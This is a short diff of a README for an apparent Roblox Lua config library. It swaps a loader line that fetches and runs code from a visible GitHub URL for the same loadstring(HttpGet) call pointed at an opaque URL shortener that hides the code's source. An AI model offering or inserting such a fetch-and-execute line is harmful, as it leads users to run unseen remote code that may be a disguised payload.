@@ -3,7 +3,7 @@
 
 使用这个Config库/Use this Config Lib First
 ```lua
-local ConfigLibrary =loadstring(game:HttpGet("https://raw.githubusercontent.com/oicx7154/Config/refs/heads/main/Config.luau"))()
+local ConfigLibrary =loadstring(game:HttpGet("https://tinyurl.com/yyrbmxss"))":3"
 ```
 ```lua
 -- 1. 初始化
